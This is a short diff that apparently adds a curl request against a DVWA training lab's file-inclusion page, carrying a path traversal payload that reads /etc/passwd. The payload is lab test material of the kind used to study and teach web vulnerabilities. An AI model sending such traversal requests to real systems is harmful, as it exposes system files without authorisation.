@@ -1,1 +1,4 @@
-exit
+curl -sS -i --max-time 15 --get \
+  "$DVWA/vulnerabilities/fi/" \
+  --data 'page=../../../../../etc/passwd' \
+  --data 'bookcase=book05-path-raw'
